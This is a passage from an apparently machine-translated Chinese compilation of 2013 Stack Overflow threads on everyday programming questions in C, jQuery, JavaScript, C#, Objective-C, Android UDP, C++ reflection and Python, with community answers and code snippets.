    while(n--)
        printf("%hhu ", *(a++));
    printf("\n");
}

int main() {
    unsigned char array[8];
    memset(array, 255, 8);
    printArray(array, 8);
    scanf("%hhu", array);
    printArray(array, 8);
    return 0;
} 
```

表明 scanf 将“%hhu”解释为“%u”。它直接忽略了“hh”。输入为 1 的代码输出为：

```
255 255 255 255 255 255 255 255
1 0 0 0 255 255 255 255 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-05T03:23:55.467

重要的细节是您使用的是 Windows，并且可能是过时或不符合标准的 C 环境（编译器和标准库）。MSVCRT 仅支持 C89（即便如此，也不完全正确）；特别是，C89 中没有“hh”修饰符，它可能将“hh”解释为“h”（即`short`）。

# jquery - 下拉菜单合并到编辑字段（自动完成）

> ID：15825258
> 
> 赞同：0
> 
> 时间：2013-04-05T03:08:55.377
> 
> 标签：jquery, drop-down-menu

我是初学者，所以如果它是非常基本的东西，请原谅。

这是我的问题：

我想要一个下拉字段。所以用户可以点击箭头查看选项并选择一个。

但是同样的下拉菜单也应该允许用户输入任何内容，并且（就像谷歌一样）选项（已经由下拉菜单加载）开始在下面的弹出窗口中被建议。

例如......想象一个下拉列表，其中有一大堆职业（设计师、教师、导演......）

您可以使用箭头来展开列表，导航并选择您想要的职业...但是..您也可以开始输入 T...所以任何以 T 开头的职业都会显示在下面的弹出窗口中...很容易允许选择正确的。

我不知道如何创建这样的功能？你有什么秘诀吗？

只能使用 CSS3 吗？还是jQuery？

非常感谢你

最好的问候古斯塔沃。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T03:48:45.643

好吧，有一个名为 jQuery Choosen 的优秀插件。
使用 jQuery 你可以这样初始化：

```
<select data-placeholder="Choose a option..." class="my-chosen"></select>

$(".my-chosen").chosen({no_results_text: "No results matched"}); 
```

看看：[http](http://harvesthq.github.com/chosen/)
://harvesthq.github.com/chosen/ 下载自：[https ://github.com/harvesthq/chosen/](https://github.com/harvesthq/chosen/)

# javascript - 在 javascript dom 中，如何获取当前窗口的目标？

> ID：15825264
> 
> 赞同：4
> 
> 时间：2013-04-05T03:09:41.950
> 
> 标签：javascript, dom, tabs

假设一个链接

```
<a href='www.domain.com/mypage' target='target1' >Open in New Tab</a> 
```

打开一个`mypage`

我如何`mypage`知道当前窗口是否为“target1”

看过`window`and `window.location`，但那里似乎没有合适的东西

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-05T03:12:03.903

该[`window.name`](https://developer.mozilla.org/en-US/docs/DOM/window.name)物业是您正在寻找的。

# c# - sqlexception 不能插入重复的键行

> ID：15825278
> 
> 赞同：1
> 
> 时间：2013-04-05T03:11:31.323
> 
> 标签：c#, sql

试图更改我的 SQL 语句以更改创建用户名的格式。我正在为网页上的测试创建虚拟数据，所以我只需要多个用户。我想更改当前用户的名称，`student{integer}@email.com`并且我想将名称更改为`student{integer}`

**错误**

> **SqlException**：无法在具有唯一索引“UX_Users”的对象“dbo.Users”中插入重复的键行。重复键值为 (1, student0@email.com)。该语句已终止。

**SQL 语句**

```
string basestring = "student{0}@email.com";
string userName = "Student{0}";

using (Database dc = new Database())
{
    dc.Connection.Open();
    for (int i = 0; i < 400; i++)
    {
        string email = string.Format(basestring,i);
        string sName = string.Format(userName, i);
        User u = new User(){ Name = sName, UserName = email, InstitutionUniqueID = email, Email = email, CreationDate=DateTime.Now, InstitutionsID=1, GUID= Guid.NewGuid() };
        dc.Users.InsertOnSubmit(u); 
    }
    dc.SubmitChanges(System.Data.Linq.ConflictMode.FailOnFirstConflict);
} 
```

这是我得到错误的地方：

```
dc.SubmitChanges(System.Data.Linq.ConflictMode.FailOnFirstConflict); 
```

我正在使用 linqpad 进行测试。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T03:20:32.597

将您的代码更改为：

```
string basestring = "student{0}@email.com";
string userName = "Student{0}";

using (Database dc = new Database())
{

    for (int i = 0; i < 400; i++)
    {
         dc.Connection.Open();
        string email = string.Format(basestring,i);
        string sName = string.Format(userName, i);
        User u = new User(){ Name = sName, UserName = email, InstitutionUniqueID = email, Email = email, CreationDate=DateTime.Now, InstitutionsID=1, GUID= Guid.NewGuid() };
        dc.Users.InsertOnSubmit(u); 
        dc.SubmitChanges(System.Data.Linq.ConflictMode.FailOnFirstConflict);
        dc.Connection.Close();
    }

} 
```

您只需将提交更改放在循环中

最好的祝福

# objective-c - 如何为不采用 NSCopying 的类制作对象实例的副本？

> ID：15825281
> 
> 赞同：3
> 
> 时间：2013-04-05T03:11:55.437
> 
> 标签：objective-c, objective-c-runtime

在某些情况下（例如，当连接到内部进行测试时），能够创建不采用`NSCopying`（不实现`-copyWithZone:`）的类实例的副本会很方便。如何做到这一点？（注意：在一个类别中实现协议是不够的，因为并非所有类的实例变量都在其标题中可见。）

我已经尝试迭代对象的`Ivar`s，并且（1）对于递归（或保留）的对象类型，以及（2）对于原始类型，获取原始实例中 ivar 的地址以及正在制作的副本和`memcpy`ing缓冲区从源 ivar 的地址开始到目标 ivar 的地址。

```
@interface NSObject (ADDLCopy)

- (id)addl_generateCopyDeep:(BOOL)deepCopy;

@end

@implementation NSObject (ADDLCopy)

//modified from http://stackoverflow.com/a/12265664/1052673
- (void *)addl_ivarPointerForName:(const char *)name
{
    void *res = NULL;

    Ivar ivar = class_getInstanceVariable(self.class, name);

    if (ivar) {
        res = (void *)self + ivar_getOffset(ivar);
    }

    return res;
}

- (id)addl_generateCopyDeep:(BOOL)deepCopy;
{
    id res = [[self.class alloc] init];

    unsigned int count = 0;
    Ivar *ivars = class_copyIvarList(self.class, &count);
    for (unsigned int i = 0; i < count; i++) {
        Ivar ivar = ivars[i];
        //We need to try here because of a bug with NSGetSizeAndAlignment
        //which prevents bitfields from being handled properly and results
        //in an exception being thrown.  See this link for more discussion:
        //http://lists.apple.com/archives/cocoa-dev/2008/Sep/msg00883.html
        @try {
            NSUInteger size = 0;
            const char *encoding = ivar_getTypeEncoding(ivar);
            NSGetSizeAndAlignment(encoding, &size, NULL);
            char firstEncodingCharacter[2];
            strncpy(firstEncodingCharacter, encoding, 1);
            firstEncodingCharacter[1] = 0;
            if (strcmp(firstEncodingCharacter, "@") == 0) {
                if (deepCopy) {
                    id original = object_getIvar(self, ivar);
                    id copy = [original addl_generateCopyDeep:deepCopy];
                    object_setIvar(res, ivar, copy);
                } else {
                    id original = object_getIvar(self, ivar);
                    object_setIvar(res, ivar, original);
                }
            } else {
                const char *name = ivar_getName(ivar);
                void *bytesSource = [self addl_ivarPointerForName:name];
                void *bytesTarget = [res addl_ivarPointerForName:name];
                memcpy(bytesTarget, bytesSource, size);
            }
        }
        @catch (NSException *exception) {}
        @finally {}
    }
    free(ivars);

    return res;
}

@end 
```

这有点工作，但我知道有几个明显的问题，更不用说那些我不知道的问题。首先，它不会复制从超类继承的 ivars。其次，它不适用于收藏。此外，由于 中的[一个错误`NSGetSizeAndAlignment`](http://lists.apple.com/archives/cocoa-dev/2008/Sep/msg00883.html)，它不适用于位掩码。此外，它没有考虑关联的对象。

如何递归复制对象的实例（以及它拥有的所有对象）？如果这不是完全可能的（处理保留并存储在 void 指针中的拥有对象即使可能的话似乎也相当困难），它可以做到什么程度？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-05T05:00:35.787

简而言之，你不能。

“深度”复制是一个非常特定领域的问题。

例如，您是复制`delegate`对象的 还是`delegate`将副本的 指向同一个对象（或者您是否将其设置为 nil 并要求复制客户端进行设置）？

对于那个例子，每个上下文业务逻辑中大约有无数其他一次性位与复制相关（这就是为什么“深度复制”的概念没有在集合类上实现的原因）。

以上所有内容都假设您*实际上*拥有实现细节。对于在框架中实现的类，没有办法安全地复制它们，因为根本没有可用的数据来知道需要复制哪些内存位，更不用说如何复制了。

您需要限制复制操作的范围和定义，然后寻求解决方案。

# javascript - 如何检查参数是否是对象？

> ID：15825287
> 
> 赞同：3
> 
> 时间：2013-04-05T03:12:16.280
> 
> 标签：javascript, jquery

我知道几乎所有东西都被认为是 JavaScript 中的对象。我正在制作一个函数，它特别要求它接受的参数采用这种格式：

```
{
   a: 'b',
   c: 'd'
} 
```

因此，花括号内的这种类型的键值对是一类对象，而不是其他类型的对象。如何具体验证这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T03:16:42.237

更新：在写完以下所有内容并进一步思考之后，我建议您再看看[Trevor 的回答](https://stackoverflow.com/a/15825484/1202830)。我认为它比我的答案更值得那个美丽的绿色复选标记，这就是原因。

我从表面上接受了你的问题，然后就跑了：如果你真的想按照你所说的去做，那么像这样的函数`$.isPlainObject()`就是要走的路。但这*真的*是你需要做的吗？请记住，这`$.isPlainObject()`不是一个非常有效的功能；它枚举所有对象的属性。正如我在下面提到的，它无法区分`{}`和`new Object()`。

而不是所有这些，Trevor 建议简单地检查您需要的属性，并且在大多数情况下，大多数时候，我认为他是对的。它肯定更接近我在自己的代码中采用的方法：验证我需要的内容，忽略其余部分。

因此，请再看看他的答案并仔细考虑。（如果您移动复选标记，我不会被冒犯！）

现在我原来的答案：

jQuery中有一个[`$.isPlainObject()`](http://api.jquery.com/jQuery.isPlainObject/)函数。如果您不使用 jQuery，您可以将此函数的源代码复制到您的应用程序中。打开[jQuery 源代码](http://code.jquery.com/jquery-1.9.1.js)并搜索`isPlainObject:`.

在任何情况下都值得阅读这个函数的源代码，看看它不像`typeof`或`instanceOf`检查那么简单：

```
isPlainObject: function( obj ) {
    // Must be an Object.
    // Because of IE, we also have to check the presence of the constructor property.
    // Make sure that DOM nodes and window objects don't pass through, as well
    if ( !obj || jQuery.type(obj) !== "object" || obj.nodeType || jQuery.isWindow( obj ) ) {
        return false;
    }

    try {
        // Not own constructor property must be Object
        if ( obj.constructor &&
            !core_hasOwn.call(obj, "constructor") &&
            !core_hasOwn.call(obj.constructor.prototype, "isPrototypeOf") ) {
            return false;
        }
    } catch ( e ) {
        // IE8,9 Will throw exceptions on certain host objects #9897
        return false;
    }

    // Own properties are enumerated firstly, so to speed up,
    // if last one is own, then all properties are own.

    var key;
    for ( key in obj ) {}

    return key === undefined || core_hasOwn.call( obj, key );
},

type: function( obj ) {
    if ( obj == null ) {
        return String( obj );
    }
    return typeof obj === "object" || typeof obj === "function" ?
        class2type[ core_toString.call(obj) ] || "object" :
        typeof obj;
},

isWindow: function( obj ) {
    return obj != null && obj == obj.window;
}, 
```

还有`class2type`这个代码使用的对象：

```
// [[Class]] -> type pairs
class2type = {},

// Populate the class2type map
jQuery.each("Boolean Number String Function Array Date RegExp Object Error".split(" "), function(i, name) {
    class2type[ "[object " + name + "]" ] = name.toLowerCase();
}); 
```

（这些代码片段与上下文无关；如果您单独使用它们，则需要调整语法。）

当然，根据具体情况，您可能不需要*所有*这些检查。如果你已经在使用 jQuery，你可以直接调用`$.isPlainObject()`而不用担心细节。

另请注意，无法将对象文字与使用创建的对象区分开`new Object`：

```
var obj1 = { a:'b', c:'d' };

var obj2 = new Object();
obj2.a = 'b';
obj2.c = 'd';

console.log( $.isPlainObject(obj1) );  // prints true
console.log( $.isPlainObject(obj2) );  // also prints true! 
```

他们都`true`从中返回`$.isPlainObject()`，我很确定您设计的任何其他测试都无法分辨出哪个是哪个。

一个有趣的历史记录：当 John Resig 在 2009 年将此函数添加到 jQuery 时，他原本打算调用它`$.isObjectLiteral()`。在我的催促下，由于这种含糊其辞，他[改名为](http://jquery.10927.n7.nabble.com/ajax-feature-matrix-td140894i40.html)。`$.isPlainObject`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T03:14:19.570

通过使用 typeof

```
var obj = {x: 1, y: 2};
if (typeof obj == 'object') console.log('im an object'); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T03:16:38.233

这将检查是否`value`是 an`object`以及它是否具有属性`a`和`c`：

```
var value = {a: 1, c: 2};
if (typeof value === "object" && "a" in value && "c" in value)
{
    ...
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-05T03:20:17.110

陷阱：

*   `typeof`数组是“对象”

    ```
    typeof [] === 'object' //true 
    ```

*   `Array`是一个实例`Object`

    ```
    Array instanceof Object //true 
    ```

*   `typeof null`是“对象”

    ```
    typeof null === 'object' //true 
    ```

您可以这样做检查是否：

*   `arg`是真实的。既然`null`是假的，就在这里除草。
*   `typeof arg`是“对象”。AFAIK，只有数组和对象传递这个。
*   最后，如果`arg`不是的实例`Array`

    ```
    if(arg && typeof arg === 'object' && !(arg instanceof Array){...} 
    ```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-05T03:35:30.230

在您描述的情况下，我不会担心确保它*不是*数组或其他类型的对象。只需确保您需要的属性在那里，如果它们丢失，请发出警报。

```
function needAandC(params) {
    if (params.a === undefined || params.c === undefined)
        throw new Error('Ahhh.');

    // You've got what you need, don't worry what else is there.
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-12-05T17:18:25.223

它还取决于您要断言的确切内容。至于最常见的情况 - 参数（或合约）验证，我最近注意到 NPM 团队（[https://github.com/npm/cli](https://github.com/npm/cli)）依赖于[https://github.com/iarna/aproba](https://github.com/iarna/aproba)函数，它非常轻量级和简单的：

```
validate("O", [ val ]); // if val is not object, throws an exception 
```

该函数的作用：

```
var isObject = ( typeof val === 'object' && val !== null && !Array.isArray( val ) 
  &&  !( val instanceof Error ) && !isArguments( val ) );

function isArguments (thingy) {
  return thingy != null && typeof thingy === 'object' && thingy.hasOwnProperty('callee')
} 
```

# java - Android UDP丢包

> ID：15825298
> 
> 赞同：1
> 
> 时间：2013-04-05T03:13:39.193
> 
> 标签：java, android, udp, packet-loss

所以我正在编写一个应用程序，它通过 UDP 每秒发送 15 次 5Kb 数据包。我知道我会丢失一些数据包，但我似乎在最初几秒钟后丢失了所有数据包。即使我放慢速度以每 10 秒发送一次 5Kb 数据包，我仍然会丢失它们。什么会导致这个？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T04:55:25.160

它们都被丢弃并不奇怪。[大于 512 字节](https://stackoverflow.com/questions/1098897/what-is-the-largest-safe-udp-packet-size-on-the-internet)的有效负载不太可能使其脱离网络。这取决于路由器的 MTU 以及路由器上分配给 UDP / 互联网流量的带宽。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-05T03:26:16.693

你会很幸运地得到任何大于大约 1260 字节的 UDP 数据报。通过路由器的 UDP 普遍接受的限制是 534 字节，这在某种程度上源自 IPv4 非分段最小 576 字节。

# ios - 对 NSDictionary 进行排序，降序。如何使用 `compare:options:` 选择器发送选项？

> ID：15825300
> 
> 赞同：7
> 
> 时间：2013-04-05T03:13:48.157
> 
> 标签：ios, objective-c, xcode, cocoa

我正在尝试对 NSDictionary 进行排序。

从[Apple docs](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/Collections/Articles/Dictionaries.html) 我看到你可以使用`keysSortedByValueUsingSelector`：

```
NSDictionary *dict = [NSDictionary dictionaryWithObjectsAndKeys:
    [NSNumber numberWithInt:63], @"Mathematics",
    [NSNumber numberWithInt:72], @"English",
    [NSNumber numberWithInt:55], @"History",
    [NSNumber numberWithInt:49], @"Geography",
    nil];

NSArray *sortedKeysArray = [dict keysSortedByValueUsingSelector:@selector(compare:)]; 
```

这使：

```
// sortedKeysArray contains: Geography, History, Mathematics, English 
```

但我想要：

```
// sortedKeysArray contains: English, Mathematics, History, Geography 
```

我读过您可以使用`compare:options:`, 和 an`NSStringCompareOptions`来更改比较以在另一个方向进行比较。

但是我不明白您如何使用选择器中`compare:options:` *的选项*发送。

我想做这样的事情：

```
NSArray *sortedKeysArray = [dict keysSortedByValueUsingSelector:@selector(compare:options:NSOrderDescending)]; 
```

我应该如何切换比较的顺序？

相关： [https ://discussions.apple.com/thread/3411089?start=0&tstart=0](https://discussions.apple.com/thread/3411089?start=0&tstart=0)

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-04-05T03:27:16.477

**选项 1：**使用比较器`-compare:`反向调用：（感谢 Dan Shelly！）

```
NSArray *blockSortedKeys = [dict keysSortedByValueUsingComparator: ^(id obj1, id obj2) {
     // Switching the order of the operands reverses the sort direction
     return [objc2 compare:obj1];
}]; 
```

只需颠倒降序和升序的 return 语句，你就应该得到你想要的。

**选项2：**反转您拥有的数组：

请参阅[如何在 Objective-C 中反转 NSArray？](https://stackoverflow.com/q/586370/893113)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-05T03:24:03.523

我用 ：

```
 NSSortDescriptor *sortOrder = [NSSortDescriptor sortDescriptorWithKey:@"self" ascending:NO];
    self. sortedKeys = [[self.keyedInventoryItems allKeys] sortedArrayUsingDescriptors:[NSArray arrayWithObject:sortOrder]]; 
```

# c# - 在c#中只过滤excel文件

> ID：15825302
> 
> 赞同：15
> 
> 时间：2013-04-05T03:13:54.350
> 
> 标签：c#

我正在使用 C# 处理 excel 工作表，我很惊讶只选择了 excel 工作表。我尝试了以下代码

```
OpenFileDialog browseFile = new OpenFileDialog();
browseFile.DereferenceLinks = true;
browseFile.Filter = "Excel|*.xls|Excel 2010|*.xlsx";
// browseFile.Filter = "Link Files (*.lnk)|*.lnk";

browseFile.Title = "Browse Excel file";
if (browseFile.ShowDialog() == DialogResult.Cancel) 
```

使用此代码不仅可以获取 excel 表，还可以获取快捷方式文件。任何人都可以建议我如何限制快捷方式文件。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-04-05T04:39:41.170

请查看您是否对以下方法感到满意。
同时，让我尝试使用反射是否有可能。

```
 OpenFileDialog openKeywordsFileDialog = new OpenFileDialog();
    openKeywordsFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
    openKeywordsFileDialog.Multiselect = false;
    openKeywordsFileDialog.ValidateNames = true;
    openKeywordsFileDialog.DereferenceLinks = false; // Will return .lnk in shortcuts.
    openKeywordsFileDialog.Filter = "Excel |*.xlsx";
    openKeywordsFileDialog.FileOk += new System.ComponentModel.CancelEventHandler(OpenKeywordsFileDialog_FileOk);
    var dialogResult =  openKeywordsFileDialog.ShowDialog();

void OpenKeywordsFileDialog_FileOk(object sender, System.ComponentModel.CancelEventArgs e)
{
         OpenFileDialog fileDialog = sender as OpenFileDialog;
         string selectedFile = fileDialog.FileName;
         if (string.IsNullOrEmpty(selectedFile) || selectedFile.Contains(".lnk"))
         {
             MessageBox.Show("Please select a valid Excel File");
             e.Cancel = true;
         }
         return;
} 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-04-05T03:36:00.647

尝试使用这个。希望这有帮助！干杯! :D

browseFile.Filter = "Excel 文件 (*.xls 或*.xlsx)|* .xls;*.xlsx";

# c++ - 使用 Boost Reflect 或其他 C++ 反射库包装 C++ 函数

> ID：15825306
> 
> 赞同：2
> 
> 时间：2013-04-05T03:14:26.173
> 
> 标签：c++, boost, reflection

我发布了[这个问题](https://stackoverflow.com/questions/15812911/c-programatically-call-correct-function-parameters)。`SpongeBobFan`说答案是反思。我找到了[Boost.Reflect](http://bytemaster.github.com/boost_reflect/index.html)并且想知道如何使用该库或其他 C++ 反射库来实现这一点。请解释你的答案，因为我不能只看一眼代码就知道发生了什么。我的问题是这样的：

好的，我有一个问题。说我有这个代码：

```
int myfunc(int arg-a, int arg-b);
int mywrapperfunc(obj a, obj b); 
```

`mywrapperfunc`应该换行`myfunc`。`mywrapperfunc`丢弃第一个参数并采用第二个参数，这是一个数组。然后我使用数组项作为参数。但是假设我不知道需要多少参数`myfunc`，也不知道数组类型对象（`b`）中有多少项。我将如何 `myfunc`以正确数量的参数以编程方式调用？移交的 args 数量将与数组类型对象中的项目数相同。

编辑：`arg-a`并且`arg-b`应该来自数组类型对象。我将对象拆分为 args。

编辑：好的，好的，我正在尝试以某种意义包装 Python C API，隐藏大多数后台作业。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T16:59:18.233

你看过[反射](http://root.cern.ch/drupal/content/reflex)吗？该工具使用[GCC-XML](http://gccxml.github.io/HTML/Index.html)创建一个类似于 Java 中的反射库。

这是我最初的看法（我目前没有太多空闲时间来进一步冲洗它）：

```
// Use the Reflex library to look up "myfunc" reflectively
Type t = Type::ByName("myfunc");
// The Reflex type 'Type" has a "FunctionParameterSize()" that tells
// you how many args in a function
size_t num_params = t.FunctionParameterSize();
// Use this information to call "myfunc" with objects from "b" 
```

如果 Reflex 只提供对类成员的调用能力，那么您可以创建`myfunc()`一个静态类成员，并尝试如下操作：

```
// Load MyClass reflectively (where MyClass contains a static member function "myfunc")
Type t = Type::ByName("MyClass");
// Find the member function "myfunc"
Member m = t.MemberByName("myfunc");
// Pack the parameters from "b" into a vector
// (Assumes "b" has indexing operators, and a "length()" function)
std::vector params(&b[0], &b[b.length()-1]);
// Invoke the method "myfunc" reflectively
m.Invoke(params); 
```

你将不得不摆弄这个，我不确定我是否正确地传递参数等等，但希望这会给你一些新的想法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-17T17:45:48.427

另一个答案中建议的 GCCXML/Reflex 方案本质上建议您运行一个步骤来预处理代码，并提取有关您拥有的类/函数/字段集的信息，以便您可以以编程方式访问它们。鉴于您的说法，这听起来是正确的方向。

出现反射方案（除了其他答案中发布的内容外，我一无所知）通过一个看起来像其他可反射语言提供的动态反射的库在运行时提供这些额外的信息，代价是膨胀应用程序包含您通常不使用的所有这些反射数据（C++ 的借口是，“不要为不使用的东西付费”）。关键是你仍然必须编写这些伪反射调用来实现你的目的，所以你必须提前知道你真正想要做什么。

你不必那样*做*。如果你必须预处理源代码，你可以得到一个预处理器来提取描述性信息（有点像 GCCXML），并简单地*生成*对目标函数的调用。生成的程序将执行“反射”程序会执行的操作，但没有运行时反射库或膨胀。

理论上，您可以通过任何[程序转换](http://en.wikipedia.org/wiki/Program_transformation)来做到这一点。在实践中，这样的工具必须能够处理 C++，这非常困难。

地球上只有三个工具可以做到这一点：我们的 DMS 软件再造工具包及其 C++ 前端、Clang 和（遥远的第三个）GCC。

都提供代码解析、构建 AST 和符号表（这是您想要的反射数据），包括所有微观细节，例如“参数数量”（这似乎是 Reflect 方案的缺点，基于其他答案）。

GCC 无法重新生成有效的 C++ 代码，尽管有一些名为 GCCMelt 的扩展对此提出了一些声明，但我没有经验。（GCCXML 是 GCC 的自定义 hack，用于转储符号表数据）。Clang 确实提供了修改 C++ AST 的能力，但是您必须通过程序接口来破解树，这使得编写转换变得困难。DMS 提供源到源的表面语法转换功能，使编写转换变得更容易。(YMMV)。

关键是通过使用这些工具，您可以编写自定义代码来遍历符号表以提取您想要的函数定义等，并生成执行您想要的 C++ 代码（可变长度参数列表和所有）。[这可能比您预期的要复杂，但这与您已经知道的在线反射解决方案没有什么不同）。不需要运行时反射。

不要期望这些解决方案中的任何一个都易于实施。C++ 是一门复杂的语言，无论你选择什么实现方案，你都会为它的复杂性付出代价，除非你正在做一些非常简单的事情。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-14T16:35:48.247

不幸的是，我不认为你想要的在 C++ 中是可行的。由于 C++ 代码经过 2 个连续阶段，1) 编译和 2) 执行，因此您通常不能将直到执行时才知道的东西（myfunc 所需的参数数量）交给编译器，以便编译器可以找到正确的 myfunc 进行编译。

现在，如果 myfunc()（我假设它是一些 Python C API 调用）被声明为类似于 C 的 printf 语句，那么您有一些选择。C 中的 Printf 是用变量参数列表声明的，例如，stdio.h 可能具有类似于以下的声明：

```
int printf ( const char * format, ... ); 
```

这允许 printf 接受任意数量的参数。但是根据您的描述，这听起来不像您要包装的函数（或函数集？）。有时[，C++ 模板元编程技术](https://stackoverflow.com/questions/112277/best-introduction-to-c-template-metaprogramming)提供的东西接近于您的需求：如果您可以在编译时*计算*参数的数量，则可以使用模板类来选择要调用的 myfunc 的正确原型。例如，也许是这样的：

```
template<int N>
class Wrapper {
  public:
    mywrapperfunc() {
      if (N == 0) {
        // Call myfunc() with zero args here...
      } else if (N == 1) {
        // Call myfunc() with 1 arg here...
      } // etc...
    }
}; 
```

[C++11](http://en.wikipedia.org/wiki/C++11)[`constexpr`](http://en.wikipedia.org/wiki/C++11#constexpr_.E2.80.93_Generalized_constant_expressions)允许您在通过关键字计算在编译时使用的“N”值时有一些余地。但同样，您必须能够在编译时知道或至少计算 N 才能使其工作。

老实说，我想不出任何其他方法来完成这项工作。通过多年的编程，我提出了定义这种情况的两个基本规则：

1.  如果你想出了一个很酷的库点子，那么其他人可能已经编写了它，而且它可能比你的想法更好。更努力地看。
2.  如果还没有其他人提出该库，并且您无法弄清楚（经过大量研究）如何做到这一点，那么您使用的技术可能无法完成（例如：C++） .

# sorting - 对字典的输出进行排序

> ID：15825307
> 
> 赞同：0
> 
> 时间：2013-04-05T03:14:26.690
> 
> 标签：sorting, dictionary, python-3.x, formatting

好的，所以我有以下行星字典，每个行星都有自己的字典，其中包含其规格：

```
d={
'Mercury':{
'Distance from the sun' : 58,
'Radius' : 2439.7,
'Gas planet?' : False,
'Atmosphere?' : True,
'Moons' : []},
'Jupiter':{
'Distance from the sun' : 483,
'Radius' : 69911,
'Gas planet?' : True,
'Atmosphere?' : True,
'Moons' : ['Io', 'Ganymede', 'Callisto', 'Europa', 'Adrastea']},
'Uranus':{
'Distance from the sun' : 3000,
'Radius' : 25559,
'Gas planet?' : True,
'Atmosphere?' : True,
'Moons' : ['Miranda', 'Ariel', 'Umbriel', 'Titania', 'Oberon']},
'Mars':{
'Distance from the sun' : 207,
'Radius' : 3396.2,
'Gas planet?' : False,
'Atmosphere?' : True,
'Moons' : ['Phobos', 'Deimos']},
'Earth':{
'Distance from the sun' : 150,
'Radius' : 6371.0,
'Gas planet?' : False,
'Atmosphere?' : True,
'Moons' : ['Moon']},
'Venus':{
'Distance from the sun' : 108,
'Radius' : 6051.8,
'Gas planet?' : False,
'Atmosphere?' : True,
'Moons' : []},
'Saturn':{
'Distance from the sun' : 1400,
'Radius' : 60268,
'Gas planet?' : True,
'Atmosphere?' : True,
'Moons' : ['Pan', 'Prometheus', 'Titan', 'Phoebe', 'Rhea']},
'Neptune':{
'Distance from the sun' : 4500,
'Radius' : 24764,
'Gas planet?' : True,
'Atmosphere?' : True,
'Moons' : ['Triton', 'Nereid', 'Proteus', 'Naiad', 'Thalassa']}}` 
```

基本上我想要做的是按照它在字典中出现的顺序打印它，所以我使用了代码：

```
for planets in sorted(d.keys()):
print(planets)
    for k,v in sorted(d[planets].items()):
        print(k, ":", v) 
```

然而，这会产生每个行星的随机顺序和每个行星描述的关键值。（当我在 python 中运行它时，行星名称及其规格打印在它下面，我只是不知道如何格式化它以在堆栈上以这种方式显示它）

IE：

```
Neptune
Moons : ['Triton', 'Nereid', 'Proteus', 'Naiad', 'Thalassa']
Radius : 24764
Distance from the sun : 4500
Gas planet? : True
Atmosphere? : True
Jupiter
Moons : ['Io', 'Ganymede', 'Callisto', 'Europa', 'Adrastea']
Radius : 69911
Distance from the sun : 483
Gas planet? : True
Atmosphere? : True
Earth
Moons : ['Moon']
Radius : 6371.0
Distance from the sun : 150
Gas planet? : False
Atmosphere? : True
Mercury
Moons : []
Radius : 2439.7
Distance from the sun : 58
Gas planet? : False
Atmosphere? : True
Mars
Moons : ['Phobos', 'Deimos']
Radius : 3396.2
Distance from the sun : 207
Gas planet? : False
Atmosphere? : True
Uranus
Moons : ['Miranda', 'Ariel', 'Umbriel', 'Titania', 'Oberon']
Radius : 25559
Distance from the sun : 3000
Gas planet? : True
Atmosphere? : True
Venus
Moons : []
Radius : 6051.8
    Distance from the sun : 108
    Gas planet? : False
    Atmosphere? : True
    Saturn
    Moons : ['Pan', 'Prometheus', 'Titan', 'Phoebe', 'Rhea']
    Radius : 60268
    Distance from the sun : 1400
    Gas planet? : True
    Atmosphere? : True 
```

我试过使用`sorted()`，但这只是按字母顺序排列。有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:14:15.277

这是无法做到的。Python`dictionaries`不对它们的打印顺序做出任何承诺。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-01-14T21:01:42.470

这很简单（作为一种解决方法）：只需将任何键放入列表中，对其进行排序，然后逐个元素地访问它，使用它作为访问和打印字典的键。

# python - 穿过一棵树

> ID：15825312
> 
> 赞同：0
> 
> 时间：2013-04-05T03:14:55.950
> 
> 标签：python, tree, traversal

我想编写一个函数，它返回列表中树中的所有元素。我不允许使用全局变量。这是我尝试过的：

```
def traverse(current node):    
    if no left child and no right child:
        return current nodes data
    else:
        if both left child and right child exist:
            return [current nodes data,left_child.traverse(),right_child._traverse()]
        elif no left child:   return [current node's data,right_child.traverse()]
        elif no right child:  return [current node's data,left_child.traverse()] 
```

我们用这个例子：（根是2，左孩子是1，右孩子是3，右孩子的右孩子是4）

```
 2
1      3
          4 
```

在这棵树上调用 traverse 返回：

`[2, 1, [3, 4]]`

所以唯一的问题是我们不能把它全部放在一个列表中。

编辑：这里有一些可以调用的节点函数： `node.data`, `node.left`,`node.right`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T03:21:23.473

您不想返回值列表，而是希望传入一个数组并将值递归地附加到数组中：

```
def traverse(node, arr):
    if node.left:
        traverse(node.left, arr)
    arr.append(node.data)
    if node.right:
        traverse(node.right, arr)
    return arr # this is for convenience so we don't have to store arr 
```

您可以通过调用以下方式获取列表：

```
traverse(node, []) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T03:22:36.960

问题是每个函数调用都在创建一个新列表并将其附加到现有列表中。相反，您希望将子节点添加到现有列表中。

这是一个不依赖于在调用之间显式传递列表的递归解决方案：

```
def traverse(node):
    if node.left and node.right:
        return [node.data] + traverse(node.left) + traverse(node.right)
    elif node.left:
        return [node.data] + traverse(node.left)
    elif node.right:
        return [node.data] + traverse(node.right)
